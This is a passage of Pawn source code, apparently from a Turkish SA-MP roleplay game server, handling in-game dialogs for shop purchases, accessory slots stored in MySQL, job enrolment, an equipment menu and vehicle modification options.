		        if(Karakter[playerid][para]-350 >= 0)
		        {
					GivePlayerCash(playerid, -350);
					Isyeri[id][ikasa] += floatround(350/2);
					Bilgi(playerid, "Telsiz satýn aldýnýz.");
					Ipucu(playerid, "''/frekans'' komutuyla telsiz frekansýný ayarlayabilirsiniz.");
					Ipucu(playerid, "Telsiz ile konuþmak için ''/t(elsiz) [yazý]''.");
					Karakter[playerid][telsiz] = 1;
				}
				else
				{
				    Hata(playerid, "Yeterli paranýz yok.");
				}
		    }
			else if(listitem == 14)
			{
			    if(Karakter[playerid][para]-50 >= 0)
		        {
					GivePlayerCash(playerid, -50);
					Isyeri[id][ikasa] += floatround(50/2);
					GivePlayerTelephoneNumber(playerid);
					static mstring[128];
					format(mstring, 128, "SimKart satýn aldýnýz, telefon numaranýz %d olarak deðiþmiþtir.",Karakter[playerid][telno]);
					Bilgi(playerid, mstring);
				}
				else
				{
				    Hata(playerid, "Yeterli paranýz yok.");
				}
			}
			else if(listitem == 15)
			{
			    if(Karakter[playerid][para]-75 >= 0)
		        {
		            if(Karakter[playerid][notdefteri] == 1) return Hata(playerid, "Zaten not defteriniz bulunmaktadýr.");
					GivePlayerCash(playerid, -75);
					Isyeri[id][ikasa] += floatround(75/2);
					Bilgi(playerid, "Not defteri satýn aldýnýz.");
					Karakter[playerid][notdefteri] = 1;
				}
				else
				{
				    Hata(playerid, "Yeterli paranýz yok.");
				}
			}
			else if(listitem == 16)
			{
			    if(Karakter[playerid][para]-500 >= 0)
		        {
		            if(gToolkit[playerid] == 1) return Hata(playerid, "Zaten alet çantanýz bulunmaktadýr.");
					GivePlayerCash(playerid, -500);
					Isyeri[id][ikasa] += floatround(500/2);
					Bilgi(playerid, "Alet çantasý aldýnýz.");
	        		gToolkit[playerid] = 1;
				}
				else
				{
				    Hata(playerid, "Yeterli paranýz yok.");
				}
			}
		}
		KarakterKaydet(playerid);
		return 1;
	}
	if(dialogid == 137)
	{
	    if(response)
	    {
		    if(listitem == 0) Hata(playerid, "[rOS] Üzgünüz 'Rehber' çalýþmayý durdurdu.");
			else
			{
			    new isim[25], num, mesaj[128];
			    RehberID(playerid, listitem, isim, num);
			    GetPVarString(playerid, "SMS", mesaj, 128);
			    TelefonMesajGonder(playerid, num, mesaj);
			}
		}
	}
	if(dialogid == 138)
	{
	    if(strlen(inputtext) != 0)
	    {
	        SetPVarString(playerid, "SMS", inputtext);
		    if(response)
		    {
		        GetRehber(playerid, 1);
		    }
		    else
		    {
		        ShowPlayerDialog(playerid, 139, DIALOG_STYLE_INPUT, "Telefon ~ Mesaj", "Mesajýnýzý göndermek istediðiniz numarayý giriniz.", "Gönder", "Vazgeç");
			}
		}
	}
	if(dialogid == 139)
	{
	    if(response)
		{
		    if(strval(inputtext) != 0)
		    {
				new mesaj[128];
			    GetPVarString(playerid, "SMS", mesaj, 128);
			    TelefonMesajGonder(playerid, strval(inputtext), mesaj);
			}
			else Hata(playerid, "Eksik ya da yanlýþ bir numara girdiniz.");
		}
	}
	if(dialogid == 140)
	{
	    if(response)
	    {
	        if(strval(inputtext) != 0) AramaYap(playerid, strval(inputtext));
	        else Hata(playerid, "Eksik ya da yanlýþ bir numara girdiniz.");
	    }
	}
	if(dialogid == 141)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        Karakter[giveplayerid][chatstili] = strval(inputtext);
	        KarakterKaydet(giveplayerid);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}

	if(dialogid == 9141)
    {
		if(aksEdit[playerid] != -1) return 1;
        if(!response)
		{
			OnPlayerCommandPerformed(playerid,"/aksesuar giy",0);
	        DeletePVar(playerid,"IndexSecimi");
	        aksEdit[playerid] = -1;
	        return 1;
        }
		new zaxd = 0;
        new string[128];
        for(new x;x<5;x++)
        {
            if(MySQLCheckAksesuar(Karakter[playerid][sqlid],x) != 0){ format(string, sizeof(string), "%s%s (SLOT %d)\n", string, GetAksesuarNameFromList(aksesuar[playerid][x][amodel]),x); zaxd++; }
            else { format(string, sizeof(string), "%s(Yok)\n",string); }
        }
        if(zaxd == 0)
		{
			Hata(playerid, "Henüz bir aksesuar satýn almamýþsýnýz. Kýyafet dükkanlarýndan aksesuar satýn alabilirsiniz.");
			return 1;
        }
        ShowPlayerDialog(playerid, 142, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Slot Seçiniz", string, "Seç", "Ýptal");
		return 1;
    }
	if(dialogid == 142)
    {
		if(aksEdit[playerid] != -1) return 1;
        if(!response)
		{
	        DeletePVar(playerid,"IndexSecimi");
	        return 1;
        }
		if(MySQLCheckAksesuar(Karakter[playerid][sqlid],listitem) == 0)
		{
	        DeletePVar(playerid,"IndexSecimi");
	        aksEdit[playerid] = -1;
	        Hata(playerid,"Bu slotta bir aksesuar bulunmuyor.");
			return 1;
		}
        SetPVarInt(playerid, "IndexSecimi", listitem);
	    new string[256+1];
        for(new x;x<sizeof(AttachmentBones);x++) format(string, sizeof(string), "%s%s\n", string, AttachmentBones[x]);
        ShowPlayerDialog(playerid, 143, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Bölge Seçiniz", string, "Seç", "Ýptal");
		return 1;
    }
	if(dialogid == 143)
    {
		if(aksEdit[playerid] != -1) return 1;
        if(!response)
		{
	        DeletePVar(playerid,"IndexSecimi");
	        return 1;
        }
		SendClientMessage(playerid, COLOR_WHITE, " {FFFFFF}Düzenlemeye baþladýnýz. SPACE tuþuna basýlý tutarak karakterinizin etrafýný daha rahat görebilirsiniz.");
		SendClientMessage(playerid, COLOR_WHITE, " {FFFFFF}Aksesuar pozisyonunu sýfýrlamak için düzenleme modundan çýkýp /aksesuar sifirla yazýnýz.");
		SendClientMessage(playerid, COLOR_WHITE, " {FFFFFF}Düzenlemenizi kurallar çerçevesinde yapmaya özen gösteriniz.");
        new numara = GetPVarInt(playerid, "IndexSecimi");
		aksesuar[playerid][numara][abone] = listitem+1;
		SetPlayerAttachedObject(playerid,numara,aksesuar[playerid][numara][amodel],aksesuar[playerid][numara][abone],aksesuar[playerid][numara][akX],aksesuar[playerid][numara][akY],aksesuar[playerid][numara][akZ],aksesuar[playerid][numara][arX],aksesuar[playerid][numara][arY],aksesuar[playerid][numara][arZ],aksesuar[playerid][numara][aoX],aksesuar[playerid][numara][aoY],aksesuar[playerid][numara][aoZ]);
        EditAttachedObject(playerid, numara);
        aksEdit[playerid] = numara;
		return 1;
    }
    if(dialogid == 144)
    {
        if(response)
        {
            new string[128];
			new vehID = GetPlayerVehicleID(playerid);
			if(!IsPlayerInAnyVehicle(playerid))
			{
				DisablePlayerCheckpoint(playerid);
				SevkiyatCheckpoint[playerid] = 0;
				SevkiyatGorev[playerid] = 0;
				Bilgi(playerid, "Araçtan indiðiniz için sevkiyat iptal edildi.");
				return 1;
			}
			format(string, sizeof(string), "~w~MOTOR ~g~CALISTIRILIYOR...");
			GameTextForPlayer(playerid, string, 2500, 4);
			MotoruAciliyor[vehID] = true;
			SetTimerEx("MotoruAc", 3000, false, "ii", vehID, playerid);
			SetPlayerCheckpoint(playerid, 2291.6096,-2321.6321,13.6379, 5.0);
			SevkiyatCheckpoint[playerid] = 2;
			SevkiyatGorev[playerid] = 1;
			if(Arac[vehID][atip] == 3) Bilgi(playerid, "Kamyonu yüklemelisiniz.");
			else Bilgi(playerid, "Aracý yüklemelisiniz.");
		}
		else RemovePlayerFromVehicle(playerid);
		return 1;
	}
    if(dialogid == 145) // renniem aksesuar
    {
        if(response)
        {
	        if(!response)
			{
		        DeletePVar(playerid,"AttachmentIndexSel");
		        return 1;
	        }
	        if(GetPlayerMoney(playerid) < AksesuarUcreti[playerid])
			{
		        DeletePVar(playerid,"AttachmentIndexSel");
				Hata(playerid, "Yeterli paranýz yok.");
		        return 1;
	        }
			new aindex = GetPVarInt(playerid, "AttachmentIndexSel");
			//printf("aindex: %d", aindex);
			aksesuar[playerid][aindex][amodel] = SectigiAksesuar[playerid];
	        aksesuar[playerid][aindex][abone] = 2;
	        aksesuar[playerid][aindex][akX] = 0.0;
	        aksesuar[playerid][aindex][akY] = 0.0;
	        aksesuar[playerid][aindex][akZ] = 0.0;
	        aksesuar[playerid][aindex][arX] = 0.0;
	        aksesuar[playerid][aindex][arY] = 0.0;
	        aksesuar[playerid][aindex][arZ] = 0.0;
	        aksesuar[playerid][aindex][aoX] = 1.0;
	        aksesuar[playerid][aindex][aoY] = 1.0;
	        aksesuar[playerid][aindex][aoZ] = 1.0;
	        aksesuar[playerid][aindex][arenk1] = 0;
	        aksesuar[playerid][aindex][arenk2] = 0;
	        if(MySQLCheckAksesuar(Karakter[playerid][sqlid], aindex) != 0) AksesuarGuncelle(playerid,aindex);
			else
			{
				new query[1024];
				format(query, sizeof(query), "INSERT INTO `aksesuarlar` (`id`, `aindex`, `amodel`, `giyilmis`, `arenk1`, `arenk2`) VALUES ('%d', '%d', '%d', '0', '0', '0')", Karakter[playerid][sqlid], aindex, SectigiAksesuar[playerid]);
				mysql_tquery(1,query);
	        }
			Bilgi(playerid,"Aksesuar satýn aldýnýz. '/aksesuar duzenle' komutu ile karakter üzerinde duruþunu düzenleyebilirsiniz.");
	        DeletePVar(playerid,"AttachmentIndexSel");
	        GivePlayerCash(playerid,-AksesuarUcreti[playerid]);
        }
        else
        {
            if(pdaksesuarda[playerid] == 1)
            {
                pdaksesuarda[playerid] = 0;
                ShowModelSelectionMenu(playerid,pdaksesuarliste, "Aksesuarlar");
			}
			else if(mcaksesuarda[playerid] == 1)
            {
                mcaksesuarda[playerid] = 0;
                ShowModelSelectionMenu(playerid,mcaksesuarliste, "Aksesuarlar");
			}
			else
			{
            	ShowModelSelectionMenu(playerid,aksesuarliste, "Aksesuarlar");
			}
        }
        return 1;
    }
	if(dialogid == 146)
    {
        if(!response)
 		{
	        DeletePVar(playerid,"AttachmentIndexSel");
	        return 1;
        }
        SetPVarInt(playerid, "AttachmentIndexSel", listitem);
        if(MySQLCheckAksesuar(Karakter[playerid][sqlid],listitem) != 0) SendClientMessage(playerid, COLOR_WHITE, " {FFFFFF}UYARI: Bu slot doludur. Yeni bir aksesuar aldýðýnýz takdirde eskisinin yerine geçecektir.");
		if(IsPlayerInRangeOfPoint(playerid, 30.0, Veriler[isbasiX],Veriler[isbasiY], Veriler[isbasiZ])) ShowModelSelectionMenu(playerid,pdaksesuarliste, "Aksesuarlar");
		else if(Birlik[Karakter[playerid][birlik]][ftip] == FBI) ShowModelSelectionMenu(playerid,pdaksesuarliste, "Aksesuarlar");
		else if(Birlik[Karakter[playerid][birlik]][ftip] == MC) ShowModelSelectionMenu(playerid,mcaksesuarliste, "Aksesuarlar");
        else ShowModelSelectionMenu(playerid,aksesuarliste, "Aksesuarlar");
		return 1;
    }
    if(dialogid == 9991)
    {
        if(!response)
 		{
	        DeletePVar(playerid,"AttachmentIndexSel");
	        return 1;
        }
        SetPVarInt(playerid, "AttachmentIndexSel", listitem);
        if(MySQLCheckAksesuar(Karakter[playerid][sqlid],listitem) != 0) SendClientMessage(playerid, COLOR_WHITE, " {FFFFFF}UYARI: Bu slot doludur. Yeni bir aksesuar aldýðýnýz takdirde eskisinin yerine geçecektir.");
		if(IsPlayerInRangeOfPoint(playerid, 30.0, Veriler[isbasiX],Veriler[isbasiY], Veriler[isbasiZ])) ShowModelSelectionMenu(playerid,pdaksesuarliste, "Aksesuarlar");
		else if(Birlik[Karakter[playerid][birlik]][ftip] == FBI) ShowModelSelectionMenu(playerid,pdaksesuarliste, "Aksesuarlar");
		else if(Birlik[Karakter[playerid][birlik]][ftip] == MC) ShowModelSelectionMenu(playerid,mcaksesuarliste, "Aksesuarlar");
        else ShowModelSelectionMenu(playerid,aksesuarliste, "Aksesuarlar");
		return 1;
    }

	if(dialogid == 147) // eski ama bir kaç þey için lazým (edited by renniem)
    {
        if(!response)
		{
	        DeletePVar(playerid,"AttachmentIndexSel");
	        return 1;
        }
        if(GetPlayerMoney(playerid) < AttachmentObjects[listitem][attachfiyat])
		{
	        DeletePVar(playerid,"AttachmentIndexSel");
			Hata(playerid, "Yeterli paranýz yok.");
	        return 1;
        }
		new aindex = GetPVarInt(playerid, "AttachmentIndexSel");
		aksesuar[playerid][aindex][amodel] = AttachmentObjects[listitem][attachmodel];
        aksesuar[playerid][aindex][abone] = 2;
        aksesuar[playerid][aindex][akX] = 0.0;
        aksesuar[playerid][aindex][akY] = 0.0;
        aksesuar[playerid][aindex][akZ] = 0.0;
        aksesuar[playerid][aindex][arX] = 0.0;
        aksesuar[playerid][aindex][arY] = 0.0;
        aksesuar[playerid][aindex][arZ] = 0.0;
        aksesuar[playerid][aindex][aoX] = 1.0;
        aksesuar[playerid][aindex][aoY] = 1.0;
        aksesuar[playerid][aindex][aoZ] = 1.0;
        aksesuar[playerid][aindex][arenk1] = 0;
        aksesuar[playerid][aindex][arenk2] = 0;
        if(MySQLCheckAksesuar(Karakter[playerid][sqlid], aindex) != 0) AksesuarGuncelle(playerid,aindex);
		else
		{
			new query[1024];
			format(query, sizeof(query), "INSERT INTO `aksesuarlar` (`id`, `aindex`, `amodel`, `giyilmis`, `arenk1`, `arenk2`) VALUES ('%d', '%d', '%d', '0', '0', '0')", Karakter[playerid][sqlid], aindex, AttachmentObjects[listitem][attachmodel]);
			mysql_tquery(1,query);
        }
		Bilgi(playerid,"Aksesuar satýn aldýnýz. \"/aksesuar\" komutu ile karakter üzerinde duruþunu düzenleyebilirsiniz.");
        DeletePVar(playerid,"AttachmentIndexSel");
		GivePlayerCash(playerid,-AttachmentObjects[listitem][attachfiyat]);
        return 1;
	}
	if(dialogid == 148)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    if(response)
	    {
	        Karakter[giveplayerid][meslek] = strval(inputtext);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 149)
	{
	    if(response)
	    {
	        Karakter[playerid][meslek] = 1;
	        Bilgi(playerid, "Sevkiyat mesleðine katýldýnýz.");
		}
	}
	if(dialogid == 150)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    new mstring[128];
			    format(mstring, sizeof(mstring), "Elinde ne kadar balýk var?\nBir balýða %d$ verebilirim.",BalikFiyatCek());
				ShowPlayerDialog(playerid, 151, DIALOG_STYLE_INPUT, "Balýkçý", mstring, "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
				ShowPlayerDialog(playerid, 152, DIALOG_STYLE_TABLIST_HEADERS, "Balýkçý: Sana ne vermemi istersin?", "Yem\tMiktar\nKarides almak istiyorum.\t 20$\nKurt almak istiyorum.\t 10$\nEkmek almak istiyorum.\t 5$" ,"Onayla", "Kapat");
			}
		    if(listitem == 2)
		    {
		        if(Karakter[playerid][para]-75 >= 0)
		        {
					if(Karakter[playerid][olta] == 1)
						return  Hata(playerid, "Zaten oltaya sahipsiniz.");
					GivePlayerCash(playerid, -75);
					Karakter[playerid][olta] = 1;
					Bilgi(playerid, "Olta satýn aldýnýz.");
				}
				else
				{
				    Hata(playerid, "Yeterli paranýz yok.");
				}
		    }
		}
		return 1;
	}
	if(dialogid == 151)
	{
		if(response)
		{
		    if(Karakter[playerid][balik] >= strval(inputtext))
		    {
			    if(strval(inputtext) > 0)
			    {
			        new  string[128];
			        format(string, sizeof(string), "Elinizdeki balýk sayýsý: %d - Toplam aldýðýnýz miktar: %d$", strval(inputtext), strval(inputtext)*BalikFiyatCek());
			        SendClientMessage(playerid, BIZIMYESIL, string);
			    	GivePlayerCash(playerid, strval(inputtext)*BalikFiyatCek());
			    	Karakter[playerid][balik] -= strval(inputtext);
				}
				else
				{
			    	Hata(playerid, "Geçersiz bir miktar girdiniz.");
			    	new mstring[128];
			    	format(mstring, sizeof(mstring), "Elinizde ne kadar balýk var?\n(1 balýk = %d$)", BalikFiyatCek());
					ShowPlayerDialog(playerid, 151, DIALOG_STYLE_INPUT, "Balýkçýlýk Mesleði", mstring, "Onayla", "Kapat");
				}
			}
			else
			{
		    	Hata(playerid, "Bu kadar balýðýnýz yok.");
		    	new mstring[128];
		    	format(mstring, sizeof(mstring), "Elinizde ne kadar balýk var?\n(1 balýk = %d$)", BalikFiyatCek());
				ShowPlayerDialog(playerid, 151, DIALOG_STYLE_INPUT, "Balýkçýlýk Mesleði", mstring, "Onayla", "Kapat");
			}
		}
		return 1;
	}
	if(dialogid == 152)
	{
		if(response)
		{
			if(listitem == 0)
			{
				ShowPlayerDialog(playerid, 153, DIALOG_STYLE_INPUT, "Balýkçý", "Ne kadar karides almak istersin? [20$] (Max.30)", "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
				ShowPlayerDialog(playerid, 154, DIALOG_STYLE_INPUT, "Balýkçý", "Ne kadar kurt almak istersin? [10$] (Max.30)", "Onayla", "Kapat");
			}
			if(listitem == 2)
			{
				ShowPlayerDialog(playerid, 155, DIALOG_STYLE_INPUT, "Balýkçý", "Ne kadar ekmek almak istersin? [5$] (Max.30)", "Onayla", "Kapat");
			}
		}
		return 1;
	}
	if(dialogid == 153)
	{
		if(response)
		{
		    if(strval(inputtext) > 0 && strval(inputtext)+Karakter[playerid][yemmiktar][1] <= 30)
		    {
				if(GetPlayerCash(playerid) < 20*strval(inputtext))
				{
					Hata(playerid, "Hatalý miktar girdiniz.");
				 	return 1;
				}
				new string[128];
				format(string, sizeof(string), "Toplam %d$ ödediniz.", strval(inputtext)*20);
				Bilgi(playerid, string);
				//if(Karakter[playerid][yem] != 1 || Karakter[playerid][yem] == 0) { Karakter[playerid][yemmiktar] = strval(inputtext); Karakter[playerid][yem] = 1; }
				//else Karakter[playerid][yemmiktar] += strval(inputtext);
				GivePlayerCash(playerid, -20*strval(inputtext));
				Karakter[playerid][yemmiktar][1] += strval(inputtext);
				Ipucu(playerid, "/yemdegistir yazarak yeminizi deðiþtirebilirsiniz.");
			}
			else Hata(playerid, "Geçersiz miktar girdiniz.");
		}
		return 1;
	}
	if(dialogid == 154)
	{
		if(response)
		{
		    if(strval(inputtext) < 1 || strval(inputtext)+Karakter[playerid][yemmiktar][2] > 30) return Hata(playerid, "Geçersiz miktar girdiniz.");
			if(GetPlayerCash(playerid) < 10*strval(inputtext))
			{
				Hata(playerid, "Yeterli paranýz yok.");
			 	return 1;
			}
			new string[128];
			format(string, sizeof(string), "Toplam %d$ ödediniz.", strval(inputtext)*10);
			Bilgi(playerid, string);
			//if(Karakter[playerid][yem] != 2 || Karakter[playerid][yem] == 0) { Karakter[playerid][yemmiktar] = strval(inputtext); Karakter[playerid][yem] = 2; }
			//else Karakter[playerid][yemmiktar] += strval(inputtext);
			GivePlayerCash(playerid, -10*strval(inputtext));
			Karakter[playerid][yemmiktar][2] += strval(inputtext);
			Ipucu(playerid, "/yemdegistir yazarak yeminizi deðiþtirebilirsiniz.");
		}
		return 1;
	}
	if(dialogid == 155)
	{
		if(response)
		{
		    if(strval(inputtext) < 1 || strval(inputtext)+Karakter[playerid][yemmiktar][3] > 30) return Hata(playerid, "Geçersiz miktar girdiniz.");
			if(GetPlayerCash(playerid) < 5*strval(inputtext))
			{
				Hata(playerid, "Yeterli paranýz yok.");
			 	return 1;
			}
			new string[128];
		    format(string, sizeof(string), "Toplam %d$ ödediniz.", strval(inputtext)*5);
		    Bilgi(playerid, string);
			//if(Karakter[playerid][yem] != 3 || Karakter[playerid][yem] == 0) { Karakter[playerid][yemmiktar] = strval(inputtext); Karakter[playerid][yem] = 3; }
			//else Karakter[playerid][yemmiktar] += strval(inputtext);
			GivePlayerCash(playerid, -5*strval(inputtext));
			Karakter[playerid][yemmiktar][3] += strval(inputtext);
			Ipucu(playerid, "/yemdegistir yazarak yeminizi deðiþtirebilirsiniz.");
		}
		return 1;
	}
	if(dialogid == 156)
	{
		if(response)
		{
		    if(listitem == 0)
		    {
				GivePlayerWeapon(playerid, 3, 1);
			}
		    if(listitem == 1)
		    {
				GivePlayerWeapon(playerid, 41, 1500);
				SetPlayerAmmo(playerid, WEAPON_SPRAYCAN, 1500);
			}
		    if(listitem == 2)
		    {
				GivePlayerWeapon(playerid, 24, 100);
				SetPlayerAmmo(playerid, WEAPON_DEAGLE, 100);
			}
		    if(listitem == 3)
		    {
		        GivePlayerWeapon(playerid, 29, 150);
		        SetPlayerAmmo(playerid, WEAPON_MP5, 150);
			}
		    if(listitem == 4)
		    {
		        GivePlayerWeapon(playerid, 31, 150);
		        SetPlayerAmmo(playerid, WEAPON_M4, 150);
			}
		    if(listitem == 5)
		    {
		        if(GetPVarInt(playerid, "BeanBag") == 1) return Hata(playerid, "Þuan beanbag kullanýyorsunuz.");
		        GivePlayerWeapon(playerid, 25, 20);
		        SetPlayerAmmo(playerid, WEAPON_SHOTGUN, 20);
			}
		    if(listitem == 6)
		    {
		        GivePlayerWeapon(playerid, 22, 100);
		        SetPlayerAmmo(playerid, WEAPON_COLT45, 100);
			}
			if(listitem == 7)
			{
			    SetPlayerArmour(playerid, 25);
			    RemovePlayerAttachedObject(playerid, ARMOUR_INDEX);
			}
			if(listitem == 8)
			{
			    SetPlayerArmour(playerid, 100);
			    SetPlayerAttachedObject( playerid, ARMOUR_INDEX, 19142,1,0.065,0.0425,0.0175,0.0,0.0,0.0,1.1,1.1,1.1);
			}
			if(listitem == 9)
			{
			    SetPlayerAttachedObject( playerid, KASK_INDEX,19141,2,0.11,0.0,0.0,0.0,0.0,0.0);
			}
			if(listitem == 10)
			{
			    SetPlayerHealth(playerid, 100);
			}
			if(listitem == 11)
			{
			    ResetPlayerWeapons(playerid);
			    SetPlayerArmour(playerid, 0);
			    RemovePlayerAttachedObject(playerid, ARMOUR_INDEX);
			    RemovePlayerAttachedObject(playerid, KASK_INDEX);
			}
			if(listitem == 12)
			{
			    if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, erkekkiyafetbeyaz, "Kiyafet Secimi");
				if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, erkekkiyafetsiyah, "Kiyafet Secimi");
				if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, kadinkiyafetbeyaz, "Kiyafet Secimi");
				if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, kadinkiyafetsiyah, "Kiyafet Secimi");
			}
		}
		return 1;
	}
	if(dialogid == 157)
	{
	    if(response)
	    {
	        Karakter[playerid][meslek] = 2;
	        Bilgi(playerid, "Taksicilik mesleðine katýldýnýz.");
	        KarakterKaydet(playerid);
	    }
	    return 1;
	}
	if(dialogid == 501)
	{
	    if(response)
	    {
	        Karakter[playerid][meslek] = 5;
	        Bilgi(playerid, "Araç sicil temizleme mesleðine katýldýnýz.");
	        KarakterKaydet(playerid);
	    }
	    return 1;
	}
	if(dialogid == 502)
	{
	    if(response)
	    {
	        Karakter[playerid][meslek] = 6;
	        Bilgi(playerid, "Otobüs Þöförlüðü mesleðine katýldýnýz.");
	        KarakterKaydet(playerid);
	    }
	    return 1;
	}
	if(dialogid == 504)
	{
	    if(response)
	    {
	        Karakter[playerid][meslek] = 7;
	        Bilgi(playerid, "Temizlikçilik mesleðine katýldýnýz.");
	        KarakterKaydet(playerid);
	    }
	    return 1;
	}
	if(dialogid == 505)
	{
	    if(response)
	    {
	        Karakter[playerid][meslek] = 8;
	        Bilgi(playerid, "Hafriyat mesleðine katýldýnýz.");
	        KarakterKaydet(playerid);
	    }
	    return 1;
	}
	if(dialogid == 920)
	{
	    if(response)
	    {
	        Karakter[playerid][meslek] = 9;
	        Bilgi(playerid, "Elektronik mesleðine katýldýnýz.");
	        KarakterKaydet(playerid);
	    }
	    return 1;
	}
	if(dialogid == 921)
	{
	    if(response)
	    {
	        Karakter[playerid][meslek] = 10;
	        Bilgi(playerid, "Lojistik mesleðine katýldýnýz.");
	        KarakterKaydet(playerid);
	    }
	    return 1;
	}
	if(dialogid == 158)
	{
		new id = GetPVarInt(playerid, "IsyeriBuy");
	    if(response)
	    {
			if(listitem == 0)
			{
			    if(Karakter[playerid][para]-25 >= 0)
			    {
			        GivePlayerCash(playerid, -25);
					Isyeri[id][ikasa] += 25;
			        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_BEER);
			    }
			    else Hata(playerid, "Yanýnýzda yeterli miktarda para bulunmamaktadýr.");
			}
			if(listitem == 1)
			{
			    if(Karakter[playerid][para]-30 >= 0)
			    {
			        GivePlayerCash(playerid, -30);
					Isyeri[id][ikasa] += 30;
			        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_WINE);
			    }
			    else Hata(playerid, "Yanýnýzda yeterli miktarda para bulunmamaktadýr.");
			}
			if(listitem == 2)
			{
			    if(Karakter[playerid][para]-10 >= 0)
			    {
			        GivePlayerCash(playerid, -10);
					Isyeri[id][ikasa] += 10;
			        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_SPRUNK);
			    }
			    else Hata(playerid, "Yanýnýzda yeterli miktarda para bulunmamaktadýr.");
			}
	    }
	}
	if(dialogid == 159)
	{
	    if(response)
	    {
			new id = GetPVarInt(playerid, "IsyeriBuy");
	    	if(listitem == 0)
	    	{
			    if(Karakter[playerid][para]-150 >= 0)
			    {
			       	GivePlayerCash(playerid, -150);
					Isyeri[id][ikasa] += 150;
			        Karakter[playerid][usaksi]++;
			        Bilgi(playerid, "Saksý satýn aldýnýz.");
			    }
			    else Hata(playerid, "Yanýnýzda yeterli miktarda para bulunmamaktadýr.");
	    	}
	    	if(listitem == 1)
	    	{
			    if(Karakter[playerid][para]-1000 >= 0)
			    {
			        if(Karakter[playerid][tezgah] == 1) return Hata(playerid, "Zaten tezgah almýþsýnýz.");
			       	GivePlayerCash(playerid, -1000);
					Isyeri[id][ikasa] += 1000;
			        Karakter[playerid][tezgah] = 1;
			        Bilgi(playerid, "Tezgah satýn aldýnýz.");
			    }
			    else Hata(playerid, "Yanýnýzda yeterli miktarda para bulunmamaktadýr.");
	    	}
	    	if(listitem == 2)
	    	{
	    	    ShowPlayerDialog(playerid, 204, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Mobilyalar", "Mutfak\nMasalar\nDuvarlar\nKapýlar\nSandalyeler\nTuvalet\nYataklar\nIþýklar\nElektronik Eþyalar\nDiðer", "Seç", "Iptal");
	    	}
		}
	}
	if(dialogid == 830)
	{
	    if(response)
	    {
	        switch(listitem)
			{		/*Renk\nPaintjob\nEgzoz\nÖn Tampon\nArka Tampon\nTepe\nSpoiler\nYan Kenarlar\nFarlar\nTekerlekler\nSes Sistemi\nHidrolik\nNitro*/
		        case 0: ShowPlayerDialog(playerid,DIALOG_RENK1,DIALOG_STYLE_INPUT,""C7"EIGHTBORN - "C8"Modifiye Sistemi","Aracýn renklerini arada virgül olacak þekilde giriniz:\n{AA3333}ÖRNEK: {6F6F6F}0,0 {FFFFFF}(siyah)","Seç","Çýkýþ");
				case 1: ShowPlayerDialog(playerid,DIALOG_PAINTJOB,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","Paintjob Sil\nPaintjob 1\nPaintjob 2\nPaintjob 3","Seç","Çýkýþ");
				case 2: ShowPlayerDialog(playerid,DIALOG_EGZOZ,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","Alien Egzoz\nX-Flow Egzoz\nChromer Egzoz\nSlamin Egzoz\nLarge Egzoz\nTwin Egzoz","Seç","Çýkýþ");
				case 3: ShowPlayerDialog(playerid,DIALOG_ONTAMPON,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi", "Alien Ön Tampon\nX-Flow Ön Tampon\nChromer Ön Tampon\nSlamin Ön Tampon","Seç","Çýkýþ");
				case 4: ShowPlayerDialog(playerid,DIALOG_ARKATAMPON,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","Alien Arka Tampon\nX-Flow Arka Tampon\nChromer Arka Tampon\nSlamin Arka Tampon","Seç","Çýkýþ");
				case 5: ShowPlayerDialog(playerid,DIALOG_TEPE,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi", "Alien Roof\nX-Flow Roof\nHardtop Roof\nSofttop Roof","Seç","Çýkýþ");
				case 6: ShowPlayerDialog(playerid,DIALOG_SPOILER,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","Alien Spoiler\nX-Flow Spoiler","Seç","Çýkýþ");
				case 7: ShowPlayerDialog(playerid,DIALOG_YANKENAR,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi", "Alien Kenar\nX-Flow Kenar\nStrip\nFlames\nArches\nTrim","Seç","Çýkýþ");
				case 8: ShowPlayerDialog(playerid,DIALOG_FARLAR,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi", "Grill Farlar\nBars Farlar\nNormal Far\nBullbar Farlar","Seç","Çýkýþ");
				case 9: ShowPlayerDialog(playerid,DIALOG_TEKERLEK,DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Modifiye Sistemi","Off-road\nMega\nWires\nTwist\nGrove\nImport\nAtomic\nAhab\nVirtual\nAccess\nTrance\nShadow\nRimshine\nKlasik\nCutter\nSwitch\nDollars","Seç","Çýkýþ");
		        case 10: ShowPlayerDialog(playerid,DIALOG_SESSISTEMI,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Modifiye Sistemi","Ses Sistemi","Seç","Çýkýþ");
